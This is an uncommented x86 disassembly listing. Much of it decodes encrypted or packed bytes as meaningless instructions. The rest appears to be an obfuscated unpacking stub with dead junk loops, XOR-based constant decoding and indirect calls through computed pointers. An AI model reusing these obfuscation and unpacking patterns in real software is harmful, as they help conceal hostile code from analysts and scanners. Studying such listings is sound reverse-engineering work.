  406a66:	mov    edi,0xe5a0588e
  406a6b:	jb     0x4069f7
  406a6d:	xchg   esi,eax
  406a6e:	mov    cl,0xe4
  406a70:	ret    
  406a71:	jl     0x406a17
  406a73:	cmc    
  406a74:	dec    ecx
  406a75:	and    eax,0xd24b9320
  406a7a:	iret   
  406a7b:	dec    edx
  406a7c:	add    bl,BYTE PTR [ebx]
  406a7e:	mov    al,0xa4
  406a80:	(bad)  
  406a83:	xor    edx,DWORD PTR [ecx+esi*4]
  406a86:	or     cl,BYTE PTR [eax+0x51]
  406a89:	ret    
  406a8a:	or     al,0x1f
  406a8c:	xor    dl,BYTE PTR [ecx-0x7e]
  406a8f:	dec    eax
  406a90:	dec    ebp
  406a91:	add    DWORD PTR [ebp-0x2],ebp
  406a94:	test   al,0x6a
  406a96:	ds sub al,0x9b
  406a99:	mov    ds:0x10f95a14,al
  406a9e:	xor    BYTE PTR [eax-0x22],bl
  406aa1:	xchg   BYTE PTR [ebx],al
  406aa3:	jns    0x406a71
  406aa5:	cmc    
  406aa6:	imul   edi,DWORD PTR [esi],0x784893dc
  406aac:	stc    
  406aad:	ss pop ss
  406aaf:	xchg   esp,eax
  406ab0:	xchg   edx,eax
  406ab1:	jle    0x406b1a
  406ab3:	add    bh,cl
  406ab5:	js     0x406b26
  406ab7:	push   ebx
  406ab8:	xor    BYTE PTR [edi+edx*4],bh
  406abb:	xchg   ebx,eax
  406abc:	xchg   esp,eax
  406abd:	jnp    0x406a87
  406abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ac0:	ret    
  406ac1:	and    DWORD PTR [ebp+0x61],eax
  406ac4:	(bad)  
  406ac5:	cmp    bh,BYTE PTR [eax+ecx*1]
  406ac8:	hlt    
  406ac9:	test   BYTE PTR [ecx-0x46],0xb8
  406acd:	mov    esp,0x67d3e43e
  406ad2:	aad    0x71
  406ad4:	mov    eax,ds:0x859d802a
  406ad9:	dec    bp
  406adb:	add    al,0xbf
  406add:	mov    ebx,0xc139d06f
  406ae2:	nop
  406ae3:	dec    ebp
  406ae4:	push   esp
  406ae5:	jae    0x406b47
  406ae7:	sbb    eax,0xeaedbca0
  406aec:	icebp  
  406aed:	jmp    0x2627:0x9d03c238
  406af4:	dec    BYTE PTR [ecx+eiz*1+0x57]
  406af8:	and    eax,0x54a7425
  406afd:	or     dh,BYTE PTR [edi]
  406aff:	jl     0x406b04
  406b01:	mov    ds:0x6a3889ce,eax
  406b06:	(bad)  
  406b07:	cmc    
  406b08:	outs   dx,DWORD PTR ds:[esi]
  406b09:	add    DWORD PTR [ebp-0x7d6d0ca2],ebp
  406b0f:	sti    
  406b10:	inc    ebp
  406b11:	sbb    DWORD PTR [ebp-0x395a5ac9],esi
  406b17:	xlat   BYTE PTR ds:[ebx]
  406b18:	test   eax,0x5b40e1fb
  406b1d:	push   eax
  406b1e:	(bad)  
  406b20:	add    BYTE PTR [esi-0xf00fbec],ah
  406b26:	sahf   
  406b27:	xchg   esi,ebx
  406b29:	fcom   DWORD PTR [ebp-0x2f]
  406b2c:	retf   0x2c9d
  406b2f:	iret   
  406b30:	scas   eax,DWORD PTR es:[edi]
  406b31:	pop    ebx
  406b32:	jb     0x406ac2
  406b34:	lods   al,BYTE PTR ss:[esi]
  406b36:	stos   BYTE PTR es:[edi],al
  406b37:	(bad)  gs:[ebx-0x16]
  406b3b:	daa    
  406b3c:	pop    edi
  406b3d:	hlt    
  406b3e:	jl     0x406bb3
  406b40:	cwde   
  406b41:	inc    ecx
  406b42:	add    edx,DWORD PTR [esi-0x7a]
  406b45:	(bad)  
  406b46:	jg     0x406b5e
  406b48:	inc    ebx
  406b49:	test   al,0x32
  406b4b:	xchg   esp,eax
  406b4c:	mov    ds:0xa3e3e255,al
  406b51:	stc    
  406b52:	mov    ch,0x61
  406b54:	test   DWORD PTR [edi-0x70],ebp
  406b57:	xlat   BYTE PTR ds:[ebx]
  406b58:	xchg   esp,eax
  406b59:	(bad)  
  406b5a:	mov    dl,0x1f
  406b5c:	push   es
  406b5d:	(bad)  
  406b5e:	(bad)  
  406b5f:	mov    bh,0xf6
  406b61:	aam    0x46
  406b63:	fidiv  DWORD PTR [eax]
  406b65:	sub    DWORD PTR [ecx+ecx*8+0x25],ebx
  406b69:	leave  
  406b6a:	inc    esp
  406b6b:	jns    0x406b76
  406b6d:	cmp    DWORD PTR [esi-0x7991236d],edi
  406b73:	jle    0x406b7d
  406b75:	jns    0x406b27
  406b77:	push   ds
  406b78:	mov    al,ds:0x51bbac87
  406b7d:	jmp    DWORD PTR [ebp-0x4e3ed9cc]
  406b83:	mov    esi,0xbb1897fc
  406b88:	aas    
  406b89:	movsx  ecx,WORD PTR [ebp-0x3ed0179d]
  406b90:	xchg   DWORD PTR [edx],edx
  406b92:	in     eax,0xc6
  406b94:	sub    BYTE PTR [eax+edi*4-0x45],ah
  406b98:	loopne 0x406bd5
  406b9a:	leave  
  406b9b:	arpl   WORD PTR [ecx],bp
  406b9d:	pop    ebp
  406b9e:	std    
  406b9f:	js     0x406b4c
  406ba1:	push   edx
  406ba2:	out    dx,eax
  406ba3:	inc    ebp
  406ba4:	jae    0x406b57
  406ba6:	(bad)  
  406ba7:	imul   ecx,DWORD PTR [ebx-0x35a6787a],0xf4543b7e
  406bb1:	add    bh,dh
  406bb3:	shl    DWORD PTR [ecx+edx*8+0x3cb7932f],0x8b
  406bbb:	push   esp
  406bbc:	add    ah,bl
  406bbe:	xchg   edi,eax
  406bbf:	(bad)  
  406bc0:	cmc    
  406bc1:	je     0x406b9b
  406bc3:	push   0xd6c98658
  406bc8:	je     0x406c29
  406bca:	stos   BYTE PTR es:[edi],al
  406bcb:	call   0x71cb:0x6bd0a898
  406bd2:	bound  edx,QWORD PTR ds:0x5837be63
  406bd8:	ds ret 0x15ae
  406bdc:	mov    edi,0x6989b83c
  406be1:	bnd ret 
  406be3:	test   DWORD PTR [esi+0x71],eax
  406be6:	and    bl,cl
  406be8:	(bad)  
  406be9:	push   edx
  406bea:	in     al,dx
  406beb:	sahf   
  406bec:	mov    ch,0xec
  406bee:	mov    ebp,fs
  406bf0:	test   al,0xb7
  406bf2:	pop    edi
  406bf3:	jmp    0x15d15cac
  406bf8:	lock loope 0x406b7c
  406bfb:	loope  0x406ba0
  406bfd:	xor    eax,0x4d3422b
  406c02:	nop
  406c03:	push   edx
  406c04:	xchg   DWORD PTR [edi+eiz*1-0x4d0a9203],ecx
  406c0b:	jae    0x406c4b
  406c0d:	outs   dx,DWORD PTR ds:[esi]
  406c0e:	shl    DWORD PTR [esp+ebp*2-0x78d29f4f],cl
  406c15:	dec    eax
  406c16:	out    0x57,al
  406c18:	(bad)  
  406c1a:	xor    bl,bl
  406c1c:	into   
  406c1d:	or     BYTE PTR [eax],dl
  406c1f:	cli    
  406c20:	sbb    eax,0xf2e0b8ed
  406c25:	dec    ebp
  406c26:	mov    cl,0xb2
  406c28:	sahf   
  406c29:	push   ecx
  406c2a:	stc    
  406c2b:	push   ds
  406c2c:	inc    esi
  406c2d:	cld    
  406c2e:	xor    eax,0x8dba2b83
  406c33:	loope  0x406bd6
  406c35:	repz inc esp
  406c37:	not    DWORD PTR [ecx-0x77]
  406c3a:	(bad)  
  406c3b:	mov    dl,0xae
  406c3d:	in     eax,0x31
  406c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c40:	fstp   TBYTE PTR [ebp+eax*2-0x5b]
  406c44:	xor    DWORD PTR [edx],0x38
  406c47:	pusha  
  406c48:	jbe    0x406bde
  406c4a:	je     0x406eec
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0x32192bde
  406c81:	pop    eax
  406c82:	outs   dx,BYTE PTR ds:[esi]
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	in     al,dx
  406c8c:	(bad)  
  406c8d:	cmp    BYTE PTR [edx+0x157bd2ed],bl
  406c93:	jmp    0x406c6c
  406c95:	sub    DWORD PTR [esi-0x16],edi
  406c98:	pop    esi
  406c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9a:	jne    0x406cef
  406c9c:	inc    ebp
  406c9d:	or     DWORD PTR [esi],0x6541b8a2
  406ca3:	jnp    0x406d15
  406ca5:	jbe    0x406c50
  406ca7:	pop    DWORD PTR [edx+0x169c0088]
  406cad:	test   BYTE PTR [edi+0x49],0x23
  406cb1:	jo     0x406c33
  406cb3:	sbb    BYTE PTR ds:0x67ffba63,0xd7
  406cba:	mov    ds:0x95bc416,eax
  406cbf:	xchg   eax,ebx
  406cc1:	mov    esp,0xf9dd91
  406cc6:	mov    ch,0xb7
  406cc8:	mov    ch,0x68
  406cca:	pop    esi
  406ccb:	rcl    BYTE PTR [edi],0x87
  406cce:	test   DWORD PTR [ebp-0x75fc72e9],0x7de2949b
  406cd8:	jge    0x406d17
  406cda:	out    0x1a,eax
  406cdc:	inc    esi
  406cdd:	add    esp,edi
  406cdf:	cmp    dl,BYTE PTR [edx-0x75]
  406ce2:	or     al,0xef
  406ce4:	xchg   edx,eax
  406ce5:	adc    ecx,esp
  406ce7:	lock push 0x9c1dd70c
  406ced:	and    dl,BYTE PTR [ebx]
  406cef:	ds cmc 
  406cf1:	jb     0x406cd7
  406cf3:	out    0xd4,eax
  406cf5:	or     DWORD PTR [ebx],0xa5abb3b
  406cfb:	bound  ecx,QWORD PTR [eax-0x2cc7a71]
  406d01:	add    eax,0xcf3505a5
  406d06:	dec    ebx
  406d07:	in     al,0x7b
  406d09:	shr    BYTE PTR [eax],1
  406d0b:	cmp    DWORD PTR [eax+0x43],esp
  406d0e:	mov    al,0xc0
  406d10:	sbb    DWORD PTR [ebp-0x5e5fc1d8],ebp
  406d16:	sub    eax,0xe074ed5d
  406d1b:	shl    BYTE PTR [edx],0xd0
  406d1e:	in     eax,dx
  406d1f:	loope  0x406d9c
  406d21:	cs xchg ecx,eax
  406d23:	mov    ebp,0x47abffa2
  406d28:	push   0xf99673f1
  406d2d:	push   ss
  406d2e:	jle    0x406d07
  406d30:	int3   
  406d31:	push   ebp
  406d32:	call   esp
  406d34:	(bad)  
  406d36:	stos   BYTE PTR es:[edi],al
  406d37:	imul   ebx,DWORD PTR [edi-0x72],0x6adaac5f
  406d3e:	add    cl,BYTE PTR [eiz*8-0x351debc3]
  406d45:	bound  edx,QWORD PTR [esp+edx*8+0x24]
  406d49:	in     al,dx
  406d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d4b:	ret    
  406d4c:	add    eax,0xc95d1f8f
  406d51:	cmp    al,0xed
  406d53:	cmp    esp,DWORD PTR [ecx+0x5a]
  406d56:	push   eax
  406d57:	cmp    al,0x4a
  406d59:	les    ebx,FWORD PTR [eax+ebx*4]
  406d5c:	out    dx,eax
  406d5d:	loopne 0x406ceb
  406d5f:	or     BYTE PTR [eax],al
  406d61:	scas   al,BYTE PTR es:[edi]
  406d62:	int    0x3f
  406d64:	test   DWORD PTR [esi],esp
  406d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d67:	in     al,dx
  406d68:	pop    ds
  406d69:	jb     0x406d42
  406d6b:	xchg   edx,eax
  406d6c:	or     al,0x9c
  406d6e:	fs jno 0x406d99
  406d71:	and    al,0xb8
  406d73:	add    bl,ah
  406d75:	or     ebp,DWORD PTR [edx-0x57c2d390]
  406d7b:	add    esi,esi
  406d7d:	ret    0x1110
  406d80:	les    edx,FWORD PTR [esp+edi*2-0x63603f1c]
  406d87:	adc    al,0xe7
  406d89:	fstp   TBYTE PTR [edi-0x1b]
  406d8c:	or     esi,esp
  406d8e:	jno    0x406df9
  406d90:	shl    ah,0x5d
  406d93:	inc    edx
  406d94:	mov    esp,DWORD PTR [ecx-0x701d1cc]
  406d9a:	sbb    DWORD PTR [ebp-0x3b],ebp
  406d9d:	leave  
  406d9e:	loop   0x406de3
  406da0:	mov    ebp,ebx
  406da2:	or     BYTE PTR [eax+edx*4+0x8],bh
  406da6:	aaa    
  406da7:	cld    
  406da8:	inc    eax
  406da9:	mov    DWORD PTR [edx+0xdaabcd1],edx
  406daf:	mov    ebp,0xd59a93d8
  406db4:	test   BYTE PTR [ebp+0x55ce3e86],ch
  406dba:	pop    esi
  406dbb:	xor    dl,BYTE PTR [edi+0x4b99ea27]
  406dc1:	arpl   WORD PTR [ebp-0x4a],bx
  406dc4:	dec    ebp
  406dc5:	mov    WORD PTR [eax+0x2a],gs
  406dc8:	psubusb mm4,mm0
  406dcb:	dec    ebx
  406dcc:	inc    ebp
  406dcd:	stc    
  406dce:	push   DWORD PTR [esi-0x4c8b0282]
  406dd4:	loopne 0x406d80
  406dd6:	imul   ebx,DWORD PTR [eax-0x2705651e],0xd5ecb770
  406de0:	mov    esp,0xeace883f
  406de5:	mov    eax,0x75f8dff0
  406dea:	leave  
  406deb:	repnz xchg ecx,eax
  406ded:	xor    ch,BYTE PTR [edx+0x14df30d2]
  406df3:	jnp    0x406de0
  406df5:	fwait
  406df6:	cmc    
  406df7:	sbb    cl,BYTE PTR [ecx]
  406df9:	jne    0x406dc1
  406dfb:	fiadd  DWORD PTR [ecx-0x6]
  406dfe:	shl    esp,1
  406e00:	and    BYTE PTR [esp+eiz*2+0x40cd830c],al
  406e07:	ins    BYTE PTR es:[edi],dx
  406e08:	mov    ss:0x775392c7,al
  406e0e:	mov    al,ds:0xd0d089f8
  406e13:	jae    0x406e18
  406e15:	shr    BYTE PTR [eax-0x6],1
  406e18:	outs   dx,BYTE PTR ds:[esi]
  406e19:	cmp    edx,ecx
  406e1b:	or     eax,0x4966af8f
  406e20:	jno    0x406e0d
  406e22:	add    DWORD PTR [ecx+0x32],ebx
  406e25:	dec    esi
  406e26:	mov    eax,ds:0xa54520b8
  406e2b:	lock and al,0x2b
  406e2e:	fbstp  TBYTE PTR [eax+ebx*8]
  406e31:	data16 icebp 
  406e33:	loopne 0x406eb2
  406e35:	loop   0x406e36
  406e37:	add    al,0x9f
  406e39:	mov    al,ds:0x9ecaa6e6
  406e3e:	and    BYTE PTR [ebx],0xb8
  406e41:	mov    DWORD PTR [ebx],esi
  406e43:	inc    ebp
  406e44:	icebp  
  406e45:	dec    edi
  406e46:	sbb    al,0x1e
  406e48:	outs   dx,BYTE PTR ds:[esi]
  406e49:	xor    ebx,ebp
  406e4b:	dec    eax
  406e4d:	scas   eax,DWORD PTR es:[edi]
  406e4e:	leave  
  406e4f:	pop    edi
  406e50:	aas    
  406e51:	and    BYTE PTR [edi-0x77fb2ab3],bh
  406e57:	mov    BYTE PTR [eax],bl
  406e59:	aad    0xfc
  406e5b:	nop
  406e5c:	push   ss
  406e5d:	pop    esi
  406e5e:	push   cs
  406e5f:	pop    edi
  406e60:	and    ebx,esp
  406e62:	or     DWORD PTR [ecx],ecx
  406e64:	mov    al,ds:0xc2270b1a
  406e69:	or     DWORD PTR [edi],esi
  406e6b:	push   edx
  406e6c:	pop    ecx
  406e6d:	aad    0x2b
  406e6f:	scas   eax,DWORD PTR es:[edi]
  406e70:	repnz mov dh,0xd9
  406e73:	jo     0x406e4a
  406e75:	push   eax
  406e76:	sbb    ebx,DWORD PTR [ebx]
  406e78:	fisttp WORD PTR [esi-0x5a]
  406e7b:	dec    ebp
  406e7c:	pop    es
  406e7d:	mov    BYTE PTR [ebx+0x3b],ah
  406e80:	pop    ebx
  406e82:	cmp    BYTE PTR [ecx],dl
  406e84:	xor    edx,ebx
  406e86:	xchg   ebp,eax
  406e87:	sub    al,0x37
  406e89:	stos   BYTE PTR es:[edi],al
  406e8a:	mov    ch,0x94
  406e8c:	push   eax
  406e8d:	inc    eax
  406e8e:	sub    eax,0x754e18b3
  406e93:	ret    
  406e94:	lods   al,BYTE PTR ds:[esi]
  406e95:	jecxz  0x406e51
  406e97:	nop
  406e98:	je     0x406ef9
  406e9a:	mov    esi,DWORD PTR [esi+0x40]
  406e9d:	aaa    
  406e9e:	es stos DWORD PTR es:[edi],eax
  406ea0:	(bad)  
  406ea1:	fwait
  406ea2:	sub    ecx,DWORD PTR [ecx+ecx*8+0x15197352]
  406ea9:	stos   BYTE PTR es:[edi],al
  406eaa:	and    eax,DWORD PTR [edx+0x73c3fbf3]
  406eb0:	xchg   ebx,eax
  406eb1:	push   0x54451caf
  406eb6:	sahf   
  406eb7:	cmp    eax,DWORD PTR [edx+0x35]
  406eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebb:	mov    ebp,0xe526060d
  406ec0:	xchg   ebx,eax
  406ec1:	cmc    
  406ec2:	xchg   DWORD PTR [ebx+edi*8-0x47],ecx
  406ec6:	aad    0xb5
  406ec8:	out    dx,al
  406ec9:	adc    al,0x67
  406ecb:	xchg   BYTE PTR [eax-0x7f159d5e],bl
  406ed1:	pop    ss
  406ed2:	push   ds
  406ed3:	xor    esi,0xb837a8b4
  406ed9:	push   es
  406eda:	ja     0x6cc8bfbb
  406ee0:	push   cs
  406ee1:	loop   0x406e76
  406ee3:	add    DWORD PTR [edx+0x4e779554],0xffffffa6
  406eea:	lods   eax,DWORD PTR ds:[esi]
  406eeb:	mov    eax,DWORD PTR cs:[ebp+0x10]
  406eef:	leave  
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
